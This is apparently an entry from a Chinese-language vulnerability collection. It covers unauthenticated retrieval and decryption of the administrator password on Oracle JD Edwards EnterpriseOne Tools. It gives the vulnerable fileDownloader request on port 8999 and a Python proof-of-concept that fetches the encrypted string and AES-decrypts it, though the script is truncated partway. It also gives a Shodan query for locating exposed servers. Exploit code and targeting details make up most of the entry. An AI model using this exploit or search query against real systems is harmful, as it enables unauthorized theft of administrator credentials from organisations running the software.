# OracleJDEdwardsEnterpriseOneTools未授权获取管理员密码泄漏

- **系统**：OracleJDEdwardsEnterpriseOneTools　|　**类型**：未授权访问　|　**CVE**：—
- **请求**：`http://ip:8999/manage/fileDownloader?sec=1`

**请求体 / payload**
```
python3 poc.py --string ACHCJKFKHCJKKKJJIBBOCDPIHOEJIICHDGHGJEBABEAG
import base64
import argparse
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
def main():
# Display ASCII art
print("""
______   ______    ___  ___  ___  ___      ___ ________ ____
/ ___/  / / __/____  / _ \_  / _ \_____  /_  /_  /_  /
/ /__  / / _//___/ __// // / __// // /___/ __/ / //_ <_/_ <
\___/ ___/___/   /____/\___/____/\___/   /____//_/____/____/
""")
# Parse command-line arguments
parser = argparse.ArgumentParser(description='Decrypt a given string.')
parser.add_argument('--string', help='The string to be decrypted')
parser.add_argument('--target', help='The target URL to fetch the string from')
args = parser.parse_args()
if args.target:
# Fetch the response from the target URL
response = fetch_target_string_with_curl(args.target)
if response:
input_str = response
print(f"Fetched string from target: {input_str}")
else:
print("No valid string found in the response.")
return
elif args.string:
input_str = args.string
else:
print("You must provide either --string or --target.")
return
# Decrypt the string
array_of_bytes = jde_decipher(input_str.encode("UTF-8"))
print("Decrypted string:", array_of_bytes.decode("UTF-8"))
def fetch_target_string_with_curl(target_url):
try:
# Use curl to fetch the target URL with SSL verification disabled
result = subprocess.run(['curl', '-k', target_url], capture_output=True, text=True)
if result.returncode == 0:
response_text = result…（脚本共 3216 字，完整版见原文）
```
- **预期**：200　|　—

**其他**
- SHadon语法: port:8999 product:"Oracle WebLogic Server"